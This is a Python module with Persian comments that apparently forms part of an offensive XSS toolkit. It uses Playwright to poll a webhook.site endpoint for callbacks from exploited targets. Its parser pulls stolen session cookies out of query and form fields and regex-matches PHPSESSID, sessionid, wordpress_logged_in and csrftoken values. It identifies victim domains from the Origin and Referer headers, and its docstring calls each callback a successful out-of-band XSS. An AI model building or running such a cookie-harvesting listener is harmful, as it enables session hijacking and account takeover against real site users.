import re
from urllib.parse import urlparse, parse_qs, unquote
from typing import List, Optional, Dict
from playwright.async_api import BrowserContext, Page


class RequestCatcherMonitor:
    """
    این نسخه کاملاً از طریق Playwright کار می‌کنه — یک صفحه‌ی واقعی روی
    دامنه‌ی webhook.site باز می‌شه (self.page) و می‌مونه باز. برای خوندن
    ریکوئست‌های جدید، به‌جای کلیک کردن روی آیتم‌های سایدبار و مبارزه با
    foldout/id تکراری DOM انگیولار، از داخل همون صفحه یک `fetch()` به
    API رسمی JSON خود وبهوک می‌زنیم:

        GET /token/<token_id>/requests?sorting=newest&per_page=N

    چون این fetch از داخل خودِ صفحه (که از قبل روی همون origin باز شده)
    اجرا می‌شه:
    - هیچ تماس مستقیم بیرون از Playwright وجود نداره؛ درخواست از داخل
      مرورگری که Playwright راه انداخته صادر می‌شه.
    - چون same-origin هست، مشکل CORS نداریم.
    - نیازی به reload/کلیک/باز کردن foldout نیست، پس تمام باگ‌های قبلی
      (id تکراری requestDetails، ng-if بسته بودن پنل‌ها، race condition
      انگیولار) اصلاً مطرح نمی‌شن.
    """

    def __init__(self, base_url: str, context: BrowserContext, target_domain: str = None):
        self.base_url = base_url.rstrip('/')
        self.context = context
        self.page: Optional[Page] = None
        self.target_domain = target_domain

        parsed = urlparse(self.base_url)
        self.api_host = f"{parsed.scheme}://{parsed.netloc}"
        # استخراج token_id به‌شکلی که هم آدرس ساده رو پوشش بده:
        #   https://webhook.site/7b759208-d096-4adc-aba3-aacc1d37c876
        # و هم آدرس view که از نوار آدرس مرورگر کپی می‌شه رو:
        #   https://webhook.site/#!/view/7b759208-.../2f4964b7-.../1
        # نکته‌ی مهم: هر چیزی بعد از '#' در URL هیچ‌وقت به سرور فرستاده
        # نمی‌شه (فقط مسیریابی سمت کلاینت انگیولاره)، پس urlparse().path
        # برای فرمت دوم خالی برمی‌گرده و token_id رو گم می‌کنه. برای همین
        # به‌جای تکیه به .path، مستقیم اولین UUID رو از کل رشته‌ی URL
        # (چه توی path چه توی fragment) با regex پیدا می‌کنیم.
        uuid_pattern = r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
        match = re.search(uuid_pattern, self.base_url)
        self.token_id = match.group(0) if match else ''

        self.seen_uuids = set()
        self.all_requests: List[Dict] = []

    async def start(self):
        if not self.token_id:
            print(f"  [!] Could not extract token id from URL: {self.base_url}")
            return

        self.page = await self.context.new_page()
        try:
            print(f"  [*] Opening Webhook.site: {self.base_url}")
            await self.page.goto(self.base_url, wait_until="domcontentloaded", timeout=30000)
            # این صفحه دیگه هیچ‌وقت reload یا کلیک نمی‌شه؛ فقط به‌عنوان
            # "پنجره‌ی same-origin" برای fetch کردن API نگه داشته می‌شه.

            if self.target_domain:
                print(f"      Target Domain: {self.target_domain}")

            existing = await self._fetch_requests(per_page=100)
            for item in existing:
                uuid = item.get('uuid')
                if uuid:
                    self.seen_uuids.add(uuid)

            print(f"  [+] Webhook monitor ready (Playwright fetch mode)")
            print(f"      Initial requests: {len(self.seen_uuids)}")
        except Exception as e:
            print(f"  [!] Monitor start error: {str(e)[:120]}")

    async def _fetch_requests(self, per_page: int = 100) -> List[Dict]:
        """
        از داخل صفحه‌ی همون‌origin با fetch() به API وبهوک می‌زنه.
        این تنها راه ارتباطیه؛ همه‌چیز از طریق self.page (که Playwright
        کنترلش می‌کنه) انجام می‌شه.
        """
        if not self.page:
            return []

        api_url = f"{self.api_host}/token/{self.token_id}/requests?sorting=newest&per_page={per_page}"

        result = await self.page.evaluate(
            """
            async (url) => {
                const res = await fetch(url, {
                    headers: { 'Accept': 'application/json' }
                });
                if (!res.ok) {
                    return { __error: 'HTTP ' + res.status };
                }
                return await res.json();
            }
            """,
            api_url,
        )

        if isinstance(result, dict) and result.get('__error'):
            raise Exception(result['__error'])

        return (result or {}).get('data', [])

    async def check_new_requests(self) -> List[Dict]:
        """
        دوباره از داخل صفحه fetch می‌کنه، ریکوئست‌های با uuid جدید رو پیدا،
        پارس و برمی‌گردونه (قدیمی‌ترین اول).
        """
        try:
            items = await self._fetch_requests(per_page=100)
        except Exception as e:
            print(f"  [!] Monitor check error: {str(e)[:120]}")
            return []

        new_requests = []
        for item in items:
            uuid = item.get('uuid')
            if uuid and uuid not in self.seen_uuids:
                self.seen_uuids.add(uuid)
                parsed = self._parse_request(item)
                self.all_requests.append(parsed)
                new_requests.append(parsed)

        # API با sorting=newest جدیدترین رو اول برمی‌گردونه؛ برای نمایش
        # منطقی (به ترتیب زمان وقوع) برعکسش می‌کنیم.
        new_requests.reverse()
        return new_requests

    def _parse_request(self, item: Dict) -> Dict:
        raw_headers = item.get('headers') or {}
        # توی پاسخ API، مقدار هر هدر یک لیسته (مثلاً {"user-agent": ["Mozilla/..."]})
        headers = {
            k: (v[0] if isinstance(v, list) and v else (v if isinstance(v, str) else ''))
            for k, v in raw_headers.items()
        }

        url = item.get('url') or ''
        content = item.get('content') or ''

        raw_query = item.get('query') or {}
        query = {
            k: (v if isinstance(v, list) else [v])
            for k, v in raw_query.items()
        }
        if not query and url:
            query = parse_qs(urlparse(url).query)

        form = {}
        content_type = headers.get('content-type', '').lower()
        if content and 'application/x-www-form-urlencoded' in content_type:
            try:
                form = {
                    k: (v if isinstance(v, list) else [v])
                    for k, v in parse_qs(content).items()
                }
            except Exception:
                pass

        result = {
            'uuid': item.get('uuid', ''),
            'method': item.get('method', ''),
            'path': urlparse(url).path if url else '',
            'query': query,
            'form': form,
            'cookie': '',
            'target': '',
            'ip': item.get('ip', ''),
            'user_agent': item.get('user_agent', ''),
            'headers': headers,
            'content': content,
            'created_at': item.get('created_at', ''),
        }

        search_scopes = [result['query'], result['form']]

        for scope in search_scopes:
            for key in ['cookie', 'c', 'data', 'ck']:
                if key in scope and scope[key]:
                    raw_val = scope[key][0] if isinstance(scope[key], list) else scope[key]
                    try:
                        result['cookie'] = unquote(raw_val)
                    except Exception:
                        result['cookie'] = raw_val
                    break
            if result['cookie']:
                break

        for scope in search_scopes:
            for key in ['target', 't', 'u', 'url', 'src']:
                if key in scope and scope[key]:
                    raw_val = scope[key][0] if isinstance(scope[key], list) else scope[key]
                    try:
                        result['target'] = unquote(raw_val)
                    except Exception:
                        result['target'] = raw_val
                    break
            if result['target']:
                break

        # مهم‌ترین و قابل‌اعتمادترین منبع برای شناسایی دامنه‌ی تارگت: هدرهای
        # Origin/Referer که خود مرورگر تارگت خودکار روی هر fetch/XHR/img
        # cross-origin می‌ذاره.
        if not result['target']:
            origin_or_referer = headers.get('origin') or headers.get('referer')
            if origin_or_referer:
                result['target'] = origin_or_referer

        if not result['cookie']:
            text_to_search = f"{url} {content} {str(result['query'])} {str(result['form'])}"
            cookie_patterns = [
                r'PHPSESSID=[a-zA-Z0-9]+',
                r'sessionid=[a-zA-Z0-9]+',
                r'wordpress_logged_in_[a-f0-9]+=[^&\s"]+',
                r'csrftoken=[a-zA-Z0-9]+',
                r'_lscache_vary=[a-zA-Z0-9]+',
                r'[a-zA-Z_]+=[a-zA-Z0-9_-]{20,}',
            ]
            for pattern in cookie_patterns:
                match = re.search(pattern, text_to_search)
                if match:
                    result['cookie'] = match.group(0)
                    break

        if not result['target'] and self.target_domain:
            text_to_search = f"{url} {content}"
            if self.target_domain in text_to_search:
                result['target'] = f"Found target domain: {self.target_domain}"

        return result

    def print_new_requests(self, requests: List[Dict], payload_batch_info: str = ""):
        """
        چاپ فرمت‌شده‌ی ریکوئست‌های جدیدی که از سمت تارگت به وبهوک رسیدن.
        این یعنی XSS از نوع Out-of-Band با موفقیت اجرا شده.
        """
        if not requests:
            print(f"  [-] هیچ ریکوئست جدیدی دریافت نشد {payload_batch_info}")
            return

        print(f"\n{'='*70}")
        print(f"  [!!!] {len(requests)} ریکوئست جدید دریافت شد {payload_batch_info}")
        print(f"{'='*70}")

        for i, req in enumerate(requests, 1):
            print(f"\n  --- ریکوئست #{i} ---")
            print(f"  Method     : {req.get('method', '-')}")
            print(f"  IP         : {req.get('ip', '-')}")
            if req.get('target'):
                print(f"  Target     : {req['target']}")
            if req.get('cookie'):
                print(f"  Cookie     : {req['cookie']}")
            if req.get('user_agent'):
                print(f"  User-Agent : {req['user_agent']}")
            if req.get('query'):
                print(f"  Query      : {req['query']}")
            if req.get('form'):
                print(f"  Form       : {req['form']}")
            if req.get('content'):
                content_preview = req['content'][:200]
                print(f"  Content    : {content_preview}")

        print(f"{'='*70}\n")

    async def stop(self):
        if self.page:
            try:
                await self.page.close()
            except Exception:
                pass
            self.page = None